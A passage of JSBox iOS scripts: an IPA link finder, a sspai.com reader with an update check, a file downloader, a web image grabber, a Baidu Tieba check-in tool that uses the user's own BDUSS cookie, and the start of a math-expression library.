            name = name.match(/<\/div>(\S*?)<divclass/)[1]
            var img = sen.match(/<imgsrc=\"(\S*?)\"/)[1]
            var href = sen.match(/<ahref=\"(\S*?)\"/)[1]
            var id = href.replace(/\/|app/g, "")
            if (sen.indexOf(key) != -1) {
                data.push({
                    img: {
                        src: img
                    },
                    mc: {
                        text: name
                    },
                    id: id,
                    hhq: {
                        data: [{
                            id: id
                        }]
                    }
                })
            }
        }
        applist("Search", data)
    }

    function getipa(id, zt, title) {
        $ui.loading(true)
        $http.get({
            url: "https://ignition.fun/install.php?app=" + id,
            handler: function (resp) {
                $ui.loading(false)
                var url = resp.data.match(/http.*?\.ipa/)[0]
                if (zt == 1) {
                    $clipboard.text = url
                    $ui.alert("已复制\n\n" + url);
                } else {
                    $ui.toast("正在下载中 ...");
                    $ui.loading(true);
                    $http.download({
                        url: url,
                        handler: function (resp) {
                            $ui.loading(false);
                            if (resp.response.statusCode == "200") {
                                $share.sheet([title + ".ipa", resp.data]);
                            } else {
                                $ui.alert("下载失败");
                            }
                        }
                    });
                }
            }
        });
    }

}

function wfdh() {

    const __version = "1.4v";

    getNewVersion()

    var __width = $device.info["screen"]["width"] - 5,
        __height = $device.info['screen']["height"] - 78,
        _page = 0;

    var popDelegate = null
    var search_key = null

    $ui.push({
        props: {
            id: "list",
            title: "少数派",
            navBarHidden: true,
            statusBarStyle: 0,
        },
        views: [{
            type: "view",
            props: {
                id: "mainView",
            },
            layout: $layout.fill,
            views: [{
                    type: "image",
                    props: {
                        id: "logo",
                        radius: 10,
                        src: "https://cdn.sspai.com/sspai/assets/img/favicon/icon_152.png"
                    },
                    layout: function (make, view) {
                        make.top.equalTo(30)
                        make.left.equalTo(15)
                        make.size.equalTo($size(50, 50))
                    }
                },
                {
                    type: "label",
                    props: {
                        id: "title",
                        text: "少数派",
                        font: $font("bold", 30),
                        align: $align.center
                    },
                    layout: function (make, view) {
                        make.left.equalTo($("logo").right).offset(5)
                        make.top.equalTo($("logo")).offset(7)
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "searchIcon",
                        icon: $icon("023", $color("#e1e8f0"), $size(30, 30)),
                        bgcolor: $color("clear")
                    },
                    layout: function (make, view) {
                        make.top.equalTo($("logo")).offset(10)
                        make.right.inset(15)
                    },
                    events: {
                        tapped: function (sender) {
                            $input.text({
                                type: $kbType.default,
                                placeholder: "搜索",
                                handler: function (text) {
                                    search_key = text
                                    $http.get({
                                        url: "https://sspai.com/api/v1/search?limit=25&type=article&offset=0&keyword=" + $text.URLEncode(text),
                                        handler: function (resp) {
                                            let allData = resp.data
                                            let cdnUrl = "https://cdn.sspai.com/"
                                            for (var data in allData["list"]) {
                                                let infors = allData["list"][data]
                                                if (infors["id"] != undefined) {
                                                    $("postList").insert({
                                                        indexPath: $indexPath(0, 0),
                                                        value: {
                                                            url: {
                                                                text: "https://sspai.com/" + infors["id"]
                                                            },
                                                            postTitle: {
                                                                text: infors["title"]
                                                            },
                                                            postImage: {
                                                                src: cdnUrl + infors["banner"]
                                                            }
                                                        }
                                                    })
                                                    $("backIcon").hidden = false
                                                }
                                            }
                                        }
                                    })
                                }
                            })
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "backIcon",
                        hidden: true,
                        icon: $icon("162", $color("#e1e8f0"), $size(30, 30)),
                        bgcolor: $color("clear")
                    },
                    layout: function (make, view) {
                        make.top.equalTo($("logo")).offset(10)
                        make.right.inset(70)
                    },
                    events: {
                        tapped: function (sender) {
                            $("postList").data = []
                            loadSspaiArticle(_page)
                            $("backIcon").hidden = true
                        }
                    }
                },
                {
                    type: "matrix",
                    props: {
                        id: "postList",
                        columns: 1,
                        itemHeight: 150,
                        spacing: 10,
                        showsVerticalIndicator: false,
                        template: {
                            views: [{
                                type: "view",
                                props: {
                                    id: "postView",
                                    radius: 15,
                                    bgcolor: $color("#F4F4F4"),
                                    textColor: $color("#abb2bf"),
                                    align: $align.center,
                                    font: $font(32)
                                },
                                views: [{
                                        type: "image",
                                        props: {
                                            id: "postImage",
                                            radius: 15,
                                        },
                                        layout: function (make, view) {
                                            make.centerX.equalTo()
                                            make.size.equalTo($size($("postList").frame.width, 105))
                                        }
                                    },
                                    {
                                        type: "label",
                                        props: {
                                            id: "postTitle",
                                            lines: 2,
                                            font: $font(16),
                                        },
                                        layout: function (make, view) {
                                            make.top.equalTo($("postImage").bottom).offset(5)
                                            make.left.right.inset(10)
                                        },
                                    },
                                ],
                                layout: $layout.fill
                            }]
                        }
                    },
                    layout: function (make) {
                        make.top.equalTo($("logo").bottom).offset(5)
                        make.centerX.equalTo()
                        make.size.equalTo($size(__width, __height))
                    },
                    events: {
                        didSelect: function (sender, indexPath, data) {
                            getNews(data["url"]["text"])
                        },
                        didLongPress: function (sender, indexPath, data) {
                            $share.sheet([data.url.text, data.postTitle.text])
                        },
                        didReachBottom: function (sender) {
                            sender.endFetchingMore()
                            _page += 10
                            loadSspaiArticle(_page)
                            $device.taptic(0)
                        },
                        pulled: function (sender) {
                            if (search_key == null) {
                                $("postList").beginRefreshing()
                                $("postList").data = []
                                loadSspaiArticle(_page)
                                $("postList").endRefreshing()
                            } else {
                                $("postList").endRefreshing()
                            }
                        }
                    }
                }
            ]
        }],
        events: {
            didAppear: function () {
                if (popDelegate != null) {
                    $("list").runtimeValue().$viewController().$navigationController().$interactivePopGestureRecognizer().$setDelegate(popDelegate)
                }
            }
        }
    })

    loadSspaiArticle(_page)

    function loadSspaiArticle(_page) {
        $http.get({
            url: "https://sspai.com/api/v1/articles?offset=" + _page + "&limit=10&type=recommend_to_home&sort=recommend_to_home_at&include_total=true",
            header: {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
            },
            handler: function (resp) {
                let allData = resp.data
                let cdnUrl = "https://cdn.sspai.com/"
                for (var data in allData["list"]) {
                    let infors = allData["list"][data]
                    $("postList").insert({
                        index: $("postList").data.length,
                        value: {
                            url: {
                                text: "https://sspai.com/" + infors["id"]
                            },
                            postTitle: {
                                text: infors["title"]
                            },
                            postImage: {
                                src: cdnUrl + infors["banner"]
                            }
                        }
                    })
                }
            }
        })
    }

    function getNews(_url) {
        $ui.push({
            props: {
                title: "少数派",
                id: "web",
                navBarHidden: true,
                statusBarStyle: 0
            },
            views: [{
                type: "web",
                props: {
                    url: _url
                },
                layout: $layout.fill,
            }],
            events: {
                didAppear: function (sender) {
                    popDelegate = $("web").runtimeValue().$viewController().$navigationController().$interactivePopGestureRecognizer().$delegate()
                    $("web").runtimeValue().$viewController().$navigationController().$interactivePopGestureRecognizer().$setDelegate(null)
                }
            }
        })
    }

    function getNewVersion() {
        $http.get({
            url: "https://raw.githubusercontent.com/alpha87/JsBoxScript/master/sspai.js",
            handler: function (resp) {
                var data = resp.data
                var versionItem = new RegExp('const __version = "(.*?)v";', "g")
                var version = versionItem.exec(data)[1]
                if (version > __version) {
                    $ui.alert({
                        title: "检测到新版本",
                        message: "是否现在更新到最新版本",
                        actions: [{
                                title: "更新",
                                handler: function () {
                                    $app.openURL(encodeURI("jsbox://install?name=少数派阅读&icon=045&url=https://raw.githubusercontent.com/alpha87/JsBoxScript/master/sspai.js"))
                                    $app.close()
                                }
                            },
                            {
                                title: "取消",
                            }
                        ]
                    })
                }
            }
        })
    }

}

function xiazai() {
    /**erots
    id: 5ceca4327b968a007671ff1d
    build: 2
    */
    /// 下载助手v1.0
    /// 可以自动下载剪贴板的链接，或者手动输入
    /// 注意输入文件名的时候需要加上拓展名
    var link = $clipboard.link;
    var name;

    $ui.push({
        views: [{
                type: "input",
                props: {
                    id: "inputLink",
                    placeholder: "下载链接",
                    text: link,
                    clearOnBeginEditing: true
                },
                layout: function (make, view) {
                    make.height.equalTo(40);
                    make.left.right.top.inset(10);
                },
                events: {
                    returned: function (sender) {
                        link = sender.text;
                        sender.blur();
                    }
                }
            },
            {
                type: "input",
                props: {
                    id: "inputName",
                    placeholder: "文件名(不填写则使用服务器提供的文件名)"
                },
                layout: function (make, view) {
                    make.height.equalTo(40);
                    make.left.right.inset(10);
                    make.top.equalTo($("inputLink").bottom).offset(10);
                },
                events: {
                    returned: function (sender) {
                        name = sender.text;
                        sender.blur();
                    }
                }
            },

            {
                type: "button",
                props: {
                    id: "downloadBtn",
                    title: "下载"
                },
                layout: function (make, view) {
                    make.top.equalTo($("inputName").bottom).offset(10);
                    make.height.equalTo(50);
                    make.left.inset(10);
                },
                events: {
                    tapped: function (sender) {
                        download(link, name);
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "cancelBtn",
                    title: "取消"
                },
                layout: function (make, view) {
                    make.top.equalTo($("inputName").bottom).offset(10);
                    make.height.equalTo(50);
                    make.left.equalTo($("downloadBtn").right).offset(10);
                    make.right.inset(10);
                    make.width.equalTo($("downloadBtn"));
                },
                events: {
                    tapped: function (sender) {
                        $app.close();
                    }
                }
            }
        ]
    });

    function download(link, name) {
        if (link) {
            $http.download({
                url: link,
                showsProgress: true, // Optional, default is true
                progress: function (bytesWritten, totalBytes) {
                    var percentage = (bytesWritten * 1.0) / totalBytes;
                    $ui.progress(percentage, `下载中(${parseInt(percentage * 100)}%)`);
                },
                handler: function (resp) {
                    if (resp.error) {
                        $ui.alert("下载失败！");
                    } else {
                        if (name) {
                            $share.sheet([name, resp.data]);
                        } else {
                            $share.sheet(resp.data);
                        }
                    }
                }
            });
        } else {
            $ui.alert("没有链接！");
        }
    }

}

function tupian() {
    $app.strings = {
        "en": {
            "main-title": "Image Grabber",
            "btn-grab": "Grab",
            "downloading": "Downloading...",
            "save-all": "Save all",
            "share-all": "Share all",
            "zip-n-share": "Zip & Share",
            "quicklook": "Quick look",
            "tips-message": "Tap image to grab"
        },
        "zh-Hans": {
            "main-title": "抓图",
            "btn-grab": "抓取",
            "downloading": "下载中...",
            "save-all": "保存全部",
            "share-all": "分享全部",
            "zip-n-share": "打包分享",
            "quicklook": "预览全部",
            "tips-message": "点击图片进行抓取"
        },
        "zh-Hant": {
            "main-title": "抓圖",
            "btn-grab": "抓取",
            "downloading": "下載中...",
            "save-all": "保存全部",
            "share-all": "分享全部",
            "zip-n-share": "打包分享",
            "quicklook": "預覽全部",
            "tips-message": "點擊圖片進行抓取"
        }
    }

    var link = $context.link || $clipboard.link
    var files = []

    $ui.push({
        props: {
            title: $l10n("main-title")
        },
        views: [{
                type: "button",
                props: {
                    id: "button",
                    title: "GO"
                },
                layout: function (make) {
                    make.right.top.inset(10)
                    make.size.equalTo($size(64, 32))
                },
                events: {
                    tapped: function (sender) {
                        loadWebView()
                    }
                }
            },
            {
                type: "input",
                props: {
                    type: $kbType.url,
                    text: link
                },
                layout: function (make) {
                    make.top.left.inset(10)
                    make.right.equalTo($("button").left).offset(-10)
                    make.height.equalTo($("button"))
                },
                events: {
                    returned: function (sender) {
                        loadWebView()
                    }
                }
            },
            {
                type: "web",
                props: {
                    script: function () {
                        function extract(element) {
                            var style = getComputedStyle(element, false)
                            var props = style["backgroundImage"] || style["background"] || style["content"]
                            var matches = props.match(/(https?:\/\/[^ "'()]*)/)
                            if (matches) {
                                return matches[1]
                            }
                            return null
                        }

                        function notify(url) {
                            if (url) {
                                $notify("prepareImage", {
                                    "url": url
                                })
                            }
                        }
                        var elements = document.getElementsByTagName("*")
                        for (var i = 0; i < elements.length; ++i) {
                            var element = elements[i]
                            if (element.tagName.toLowerCase() === "img") {
                                element.onclick = function (event) {
                                    notify(event.target.src)
                                    return false
                                }
                            } else {
                                var url = extract(element)
                                if (url) {
                                    element.onclick = function (event) {
                                        notify(extract(event.target))
                                    }
                                }
                            }
                        }
                    }
                },
                layout: function (make) {
                    make.top.equalTo($("input").bottom).offset(10)
                    make.left.right.equalTo(0)
                    make.bottom.inset(180)
                },
                events: {
                    didFinish: function (sender) {
                        sender.eval({
                            script: "window.location.href",
                            handler: function (result) {
                                $("input").text = result
                            }
                        })
                    },
                    prepareImage: function (message) {
                        insertImage(message.url)
                    }
                }
            },
            {
                type: "view",
                props: {
                    bgcolor: $color("#b2b2b2")
                },
                layout: function (make) {
                    make.left.right.equalTo(0)
                    make.bottom.equalTo($("web"))
                    make.height.equalTo(0.5)
                }
            },
            {
                type: "matrix",
                props: {
                    columns: 5,
                    square: true,
                    spacing: 10,
                    template: [{
                        type: "image",
                        props: {
                            id: "image",
                        },
                        layout: $layout.fill
                    }]
                },
                layout: function (make) {
                    make.left.right.equalTo(0)
                    make.top.equalTo($("web").bottom).offset(0.5)
                    make.bottom.inset(52)
                },
                events: {
                    didSelect: function (sender, indexPath) {
                        deleteImage(indexPath)
                    }
                }
            },
            {
                type: "button",
                props: {
                    title: $l10n("btn-grab")
                },
                layout: function (make) {
                    make.top.equalTo($("matrix").bottom).offset(10)
                    make.left.right.bottom.inset(10)
                },
                events: {
                    tapped: function (sender) {
                        showMenu()
                    }
                }
            },
            {
                type: "label",
                props: {
                    id: "tip-view",
                    font: $font(17),
                    text: $l10n("tips-message"),
                    align: $align.center
                },
                layout: function (make) {
                    var view = $("matrix")
                    make.centerX.equalTo(view)
                    make.centerY.equalTo(view).offset(5)
                }
            }
        ]
    })

    function loadWebView() {
        var input = $("input")
        var link = input.text
        input.blur()
        if (link.lastIndexOf("http", 0) != 0) {
            link = "http://" + link
        }
        $("web").url = link
    }

    function insertImage(url) {
        $ui.toast($l10n("downloading"))
        $http.download({
            url: url,
            handler: function (resp) {
                var file = resp.data
                if (file) {
                    files.push(file)
                    if (files.length === 1) {
                        $("matrix").data = files.map(function (item) {
                            return {
                                image: {
                                    data: item
                                }
                            }
                        })
                    } else {
                        $("matrix").insert({
                            index: files.length - 1,
                            value: {
                                image: {
                                    data: file
                                }
                            }
                        })
                    }
                    setTipViewAlpha()
                }
            }
        })
    }

    function deleteImage(indexPath) {
        files.splice(indexPath.item, 1)
        $("matrix").delete(indexPath)
        setTipViewAlpha()
    }

    function setTipViewAlpha() {
        var alpha = files.length > 0 ? 0.0 : 1.0
        $ui.animate({
            duration: 0.2,
            animation: function () {
                $("tip-view").alpha = alpha
            }
        })
    }

    function showMenu() {
        $ui.menu({
            items: [$l10n("save-all"), $l10n("share-all"), $l10n("zip-n-share"), $l10n("quicklook")],
            handler: function (title, idx) {
                switch (idx) {
                    case 0:
                        save();
                        break
                    case 1:
                        share();
                        break
                    case 2:
                        zip();
                        break
                    case 3:
                        quicklook();
                        break
                    default:
                        break
                }
            }
        })
    }

    function save() {
        files.forEach(function (file) {
            $photo.save({
                data: file
            })
        })
    }

    function share() {
        $share.sheet(files)
    }

    function zip() {
        var dest = "archive.zip"
        $ui.loading(true)
        $archiver.zip({
            files: files,
            dest: dest,
            handler: function (success) {
                $ui.loading(false)
                if (success) {
                    $share.sheet([dest, $file.read(dest)])
                }
            }
        })
    }

    function quicklook() {
        $quicklook.open({
            list: files
        })
    }

    if (link) {
        loadWebView()
    }

}

function tieba() {
    /*
    贴吧签到升级到1.3版本
    更新时间：2018年9月27日
    更新内容：修复无法签到问题。支持多账号签到。增加添加BDUSS功能，添加管理账号，切换账号签到。
    by：iPhone 8、小良
    https://ae85.cn/
    */

    const mrhb = {
        type: "button",
        props: {
            id: "hb_img",
            radius: 30,
            src: "https://ae85.cn/wf/hb.jpg"
        },
        events: {
            tapped: function (sender) {
                $app.openURL(
                    "alipays://platformapi/startapp?appId=20000067&__open_alipay__=YES&url=https%3A%2F%2Frender.alipay.com%2Fp%2Ff%2Ffd-j6lzqrgm%2Fguiderofmklvtvw.html%3Fchannel%3DqrCode%26shareId%3D2088202699097532%26sign%3DAFml1OwpzCQC4IVlQHEDQ0LKkXiaDFyESl0GCk43ahU%253D%26scene%3DofflinePaymentNewSns%26campStr%3Dp1j%252BdzkZl018zOczaHT4Z5CLdPVCgrEXq89JsWOx1gdt05SIDMPg3PTxZbdPw9dL%26token%3Dc1x08164vrc0u6jhg7oslac"
                );
            }
        },
        layout: function (make, view) {
            make.bottom.inset(66);
            make.width.height.equalTo(60);
            make.right.inset(15);
        }
    };

    if ($file.exists("baidu")) {
        var file = $file.list("baidu");
        if (file.length > 0) {
            var wjm = file[file.length - 1];
            var data = $file.read("baidu/" + wjm);
            var id = wjm.replace(".txt", "");
            $cache.set("BDUSS", data.string);
            qiandaoui(id);
        } else {
            tianjiaui();
        }
    } else {
        $file.mkdir("baidu");
    }



    function tianjiaui() {
        $ui.push({
            props: {
                title: "添加百度账号BDUSS"
            },
            views: [{
                    type: "button",
                    props: {
                        id: "dr_img",
                        src: "https://ae85.cn/jsbox/img/drlogo.png",
                        radius: 40
                    },
                    layout: function (make, view) {
                        make.top.inset(20);
                        make.width.height.equalTo(80);
                        make.centerX.equalTo(view.center);
                    }
                },
                {
                    type: "input",
                    props: {
                        id: "bjk1",
                        placeholder: "输入百度账号"
                    },
                    layout: function (make) {
                        make.top.equalTo($("dr_img").bottom).inset(20);
                        make.left.right.inset(30);
                        make.height.equalTo(40);
                    }
                },
                {
                    type: "input",
                    props: {
                        id: "bjk2",
                        placeholder: "输入BDUSS"
                    },
                    layout: function (make) {
                        make.top.equalTo($("bjk1").bottom).inset(15);
                        make.left.right.inset(30);
                        make.height.equalTo(40);
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt1",
                        title: "添加",
                        bgcolor: $color("#149bcc")
                    },
                    layout: function (make) {
                        make.top.equalTo($("bjk2").bottom).inset(20);
                        make.left.right.inset(30);
                        make.height.equalTo(40);
                    },
                    events: {
                        tapped: function (sender) {
                            var id = $("bjk1").text;
                            var key = $("bjk2").text;

                            if (id == "") {
                                $ui.alert("请填写账号");
                            } else if (key == "") {
                                $ui.alert("请填写BDUSS");
                            } else {
                                if (
                                    $file.write({
                                        data: $data({
                                            string: key
                                        }),
                                        path: "baidu/" + id + ".txt"
                                    })
                                ) {
                                    $ui.toast("添加成功……");
                                    $cache.set("BDUSS", key);
                                    qiandaoui(id);
                                    getlb();
                                }
                            }
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt2",
                        title: "获取BDUSS教程",
                        titleColor: $color("#0000cd"),
                        bgcolor: $color("clear")
                    },
                    layout: function (make) {
                        make.top.equalTo($("bt1").bottom).inset(20);
                        make.left.inset(30);
                        make.size.equalTo($size(120, 40));
                    },
                    events: {
                        tapped: function (sender) {
                            webdr("http://t.cn/Rkb7u8i");
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt3",
                        title: "其他方式获取",
                        titleColor: $color("#0000cd"),
                        bgcolor: $color("clear")
                    },
                    layout: function (make) {
                        make.top.equalTo($("bt1").bottom).inset(20);
                        make.right.inset(30);
                        make.size.equalTo($size(110, 40));
                    },
                    events: {
                        tapped: function (sender) {
                            webdr("http://bduss.hugang8.cn/index.html");
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt4",
                        title: "作者网站",
                        titleColor: $color("#008080"),
                        bgcolor: $color("clear"),
                        borderColor: $color("#008080"),
                        borderWidth: 1
                    },
                    layout: function (make) {
                        make.bottom.inset(1);
                        make.left.inset(5);
                        make.width.equalTo(110);
                        make.height.equalTo(35);
                    },
                    events: {
                        tapped: function (sender) {
                            $app.openURL("https://ae85.cn/");
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt5",
                        title: "公众号",
                        titleColor: $color("#CD0000"),
                        bgcolor: $color("clear"),
                        borderColor: $color("#CD0000"),
                        borderWidth: 1
                    },
                    layout: function (make, kbon) {
                        make.bottom.inset(1);
                        make.centerX.equalTo(kbon.center).inset(-55);
                        make.width.equalTo(110);
                        make.height.equalTo(35);
                    },
                    events: {
                        tapped: function (sender) {
                            $app.openURL("https://ae85.cn/lxfs.html");
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt6",
                        title: "作者QQ",
                        titleColor: $color("#FF7F00"),
                        bgcolor: $color("clear"),
                        borderColor: $color("#FF7F00"),
                        borderWidth: 1
                    },
                    layout: function (make) {
                        make.bottom.inset(1);
                        make.right.inset(5);
                        make.width.equalTo(110);
                        make.height.equalTo(35);
                    },
                    events: {
                        tapped: function (sender) {
                            $app.openURL(
                                "http://wpa.qq.com/msgrd?v=3&uin=84088289&site=qq&menu=yes"
                            );
                        }
                    }
                },
                mrhb
            ]
        });
    }

    function webdr(url) {
        $ui.push({
            props: {
                title: "获取百度BDUSS"
            },
            views: [{
                type: "web",
                props: {
                    id: "webid",
                    url: url,
                    toolbar: true
                },
                layout: $layout.fill
            }]
        });
    }

    function qiandaoui(id) {
        $ui.push({
            props: {
                title: id + " - 贴吧签到"
            },
            views: [{
                    type: "matrix",
                    props: {
                        id: "lb",
                        columns: 2,
                        itemHeight: 40,
                        spacing: 5,
                        template: [{
                                type: "label",
                                props: {
                                    id: "bj",
                                    text: "",
                                    bgcolor: $color("#F8F8F8"),
                                    borderColor: $color("#f0f0f0"),
                                    borderWidth: 1
                                },
                                layout(make, view) {
                                    make.top.left.right.bottom.inset(0);
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "mc"
                                },
                                layout(make, view) {
                                    make.left.inset(10);
                                    make.top.right.bottom.inset(0);
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "zt",
                                    font: $font(13),
                                    radius: 3,
                                    textColor: $color("#C4483D"),
                                    borderColor: $color("#C4483D"),
                                    borderWidth: 1
                                },
                                layout(make, view) {
                                    make.top.inset(13);
                                    make.right.inset(35);
                                }
                            },
                            {
                                type: "label",
                                props: {
                                    id: "dj",
                                    font: $font(13),
                                    radius: 18,
                                    bgcolor: $color("#47c7ff"),
                                    textColor: $color("#ffffff"),
                                    align: $align.center
                                },
                                layout(make, view) {
                                    make.top.inset(7);
                                    make.right.inset(5);
                                    make.size.equalTo(25, 25);
                                }
                            }
                        ]
                    },
                    layout(make, view) {
                        make.top.left.right.inset(0);
                        make.bottom.inset(200);
                    },
                    events: {
                        didSelect: function (sender, indexPath, data) {
                            var tqzt = data.zt.text;
                            if (tqzt == "未签") {
                                qian(data.mc.text);
                            } else {
                                $("sm").text =
                                    $("sm").text + sj() + data.mc.text + "：已签到！\n";
                            }
                            getlb();
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "bt1",
                        title: "一键签到  (长按切换账号)",
                        bgcolor: $color("#F41093")
                    },
                    layout: function (make) {
                        make.top.equalTo($("lb").bottom).inset(10);
                        make.left.right.inset(20);
                        make.height.equalTo(40);
                    },
                    events: {
                        tapped: function (sender) {
                            var data = $("lb").data;
                            for (i in data) {
                                var zt = data[i].zt.text;
                                if (zt == "未签") {
                                    qian(data[i].mc.text);
                                } else {
                                    $("sm").text =
                                        $("sm").text + sj() + data[i].mc.text + "：已签到！\n";
                                }
                            }
                            getlb();
                        },
                        longPressed: function (sender) {
                            idlistui();
                            idlist();
                        }
                    }
                },
                {
                    type: "text",
                    props: {
                        id: "sm",
                        text: "",
                        editable: false,
                        textColor: $color("#FF4040")
                    },
                    layout: function (make) {
                        make.top.equalTo($("bt1").bottom).inset(10);
                        make.left.right.inset(10);
                        make.bottom.inset(0);
                    }
                },
                mrhb
            ]
        });
    }

    function getlb() {
        $ui.loading(true);
        var BDUSS = $cache.get("BDUSS");
        $http.request({
            method: "GET",
            url: "https://tieba.baidu.com/mo/q/newmoindex",
            header: {
                "Cookie": "BDUSS=" + BDUSS,
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366",
                "Referer": "https://tieba.baidu.com/index/tbwise/forum"
            },

            handler: function (resp) {
                $ui.loading(false);
                //      console.log(resp.data)
                var json = resp.data.data;
                var shu = json.like_forum;
                var tbs = json.tbs;
                $cache.set("tbs", tbs);
                var data = [];
                for (i in shu) {
                    var li = shu[i];
                    var zt = "";
                    if (li.is_sign == 1) {
                        zt = "已签到";
                    } else {
                        zt = "未签";
                    }
                    data.push({
                        mc: {
                            text: li.forum_name
                        },
                        zt: {
                            text: zt
                        },
                        dj: {
                            text: li.user_level
                        }
                    });
                }
                $("lb").data = data;
            }
        });
    }

    getlb();

    function qian(bm) {
        $ui.loading(true);
        var BDUSS = $cache.get("BDUSS");
        var tbs = $cache.get("tbs");
        $http.request({
            method: "POST",
            url: "https://tieba.baidu.com/sign/add",
            header: {
                "Cookie": "BDUSS=" + BDUSS,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14B100 UCBrowser/10.7.5.650 Mobile"
            },
            body: {
                ie: "utf-8",
                kw: bm,
                tbs: tbs
            },
            handler: function (resp) {
                if (resp.data.no == 0) {
                    $("sm").text = $("sm").text + sj() + bm + "：签到成功！\n";
                }
            }
        });
    }

    function sj() {
        var sj = new Date();
        var h = sj.getHours();
        var m = sj.getMinutes();
        var s = sj.getSeconds();
        return h + ":" + m + ":" + s + " - ";
    }

    function idlistui() {
        $ui.push({
            props: {
                title: "账号管理",
                bgcolor: $color("#FF1493")
            },
            views: [{
                type: "list",
                props: {
                    id: "idlist",
                    actions: [{
                        title: "删除",
                        handler: function (sender, indexPath) {
                            $file.delete(
                                "baidu/" + sender.data[0].rows[indexPath.row] + ".txt"
                            );
                            idlist();
                        }
                    }]
                },
                layout: $layout.fill,
                events: {
                    didSelect: function (sender, indexPath, data) {
                        if (data == "点击 - 添加账号") {
                            tianjiaui();
                        } else {
                            var key = $file.read("baidu/" + data + ".txt");
                            $cache.set("BDUSS", key.string);
                            qiandaoui(data);
                            getlb();
                        }
                    }
                }
            }]
        });
    }

    function idlist() {
        var arr = [];
        var file = $file.list("baidu");
        for (var i = 0; i < file.length; i++) {
            arr.push(file[i].replace(".txt", ""));
        }
        $("idlist").data = [{
                title: "账号 (" +
                    arr.length +
                    ")   -  点击切换账号                注：向左滑动可删除",
                rows: arr
            },
            {
                title: "==================================================",
                rows: ["点击 - 添加账号"]
            }
        ];
    }



}

function jisrqi() {
    var mexp;
    ! function (a) {
        mexp = a()
    }(function () {
        return function a(b, c, d) {
            function e(g, h) {
                if (!c[g]) {
                    if (!b[g]) {
                        var i = "function" == typeof require && require;
                        if (!h && i) return i(g, !0);
                        if (f) return f(g, !0);
                        var j = new Error("Cannot find module '" + g + "'");
                        throw j.code = "MODULE_NOT_FOUND", j
                    }
                    var k = c[g] = {
                        exports: {}
                    };
                    b[g][0].call(k.exports, function (a) {
                        var c = b[g][1][a];
                        return e(c ? c : a)
                    }, k, k.exports, a, b, c, d)
                }
                return c[g].exports
            }
            for (var f = "function" == typeof require && require, g = 0; g < d.length; g++) e(d[g]);
            return e
        }({
            1: [function (a, b, c) {
                var d = a("./postfix_evaluator.js");
                d.prototype.formulaEval = function () {
                    "use strict";
                    for (var a, b, c, d = [], e = this.value, f = 0; f < e.length; f++) 1 === e[f].type || 3 === e[f].type ? d.push({
                        value: 3 === e[f].type ? e[f].show : e[f].value,
                        type: 1
                    }) : 13 === e[f].type ? d.push({
                        value: e[f].show,
                        type: 1
                    }) : 0 === e[f].type ? d[d.length - 1] = {
                        value: e[f].show + ("-" != e[f].show ? "(" : "") + d[d.length - 1].value + ("-" != e[f].show ? ")" : ""),
                        type: 0
                    } : 7 === e[f].type ? d[d.length - 1] = {
                        value: (1 != d[d.length - 1].type ? "(" : "") + d[d.length - 1].value + (1 != d[d.length - 1].type ? ")" : "") + e[f].show,
                        type: 7
                    } : 10 === e[f].type ? (a = d.pop(), b = d.pop(), "P" === e[f].show || "C" === e[f].show ? d.push({
                        value: "<sup>" + b.value + "</sup>" + e[f].show + "<sub>" + a.value + "</sub>",
                        type: 10
                    }) : d.push({
                        value: (1 != b.type ? "(" : "") + b.value + (1 != b.type ? ")" : "") + "<sup>" + a.value + "</sup>",
                        type: 1
                    })) : 2 === e[f].type || 9 === e[f].type ? (a = d.pop(), b = d.pop(), d.push({
                        value: (1 != b.type ? "(" : "") + b.value + (1 != b.type ? ")" : "") + e[f].show + (1 != a.type ? "(" : "") + a.value + (1 != a.type ? ")" : ""),
                        type: e[f].type
                    })) : 12 === e[f].type && (a = d.pop(), b = d.pop(), c = d.pop(), d.push({
                        value: e[f].show + "(" + c.value + "," + b.value + "," + a.value + ")",
                        type: 12
                    }));
                    return d[0].value
                }, b.exports = d
            }, {
                "./postfix_evaluator.js": 5
            }],
            2: [function (a, b, c) {
                function d(a, b) {
                    for (var c = 0; c < a.length; c++) a[c] += b;
                    return a
                }

                function e(a, b, c, d) {
                    for (var e = 0; e < d; e++)
                        if (a[c + e] !== b[e]) return !1;
                    return !0
                }
                var f = a("./math_function.js"),
                    g = ["sin", "cos", "tan", "pi", "(", ")", "P", "C", "asin", "acos", "atan", "7", "8", "9", "int", "cosh", "acosh", "ln", "^", "root", "4", "5", "6", "/", "!", "tanh", "atanh", "Mod", "1", "2", "3", "*", "sinh", "asinh", "e", "log", "0", ".", "+", "-", ",", "Sigma", "n", "Pi", "pow"],
                    h = ["sin", "cos", "tan", "&pi;", "(", ")", "P", "C", "asin", "acos", "atan", "7", "8", "9", "Int", "cosh", "acosh", " ln", "^", "root", "4", "5", "6", "&divide;", "!", "tanh", "atanh", " Mod ", "1", "2", "3", "&times;", "sinh", "asinh", "e", " log", "0", ".", "+", "-", ",", "&Sigma;", "n", "&Pi;", "pow"],
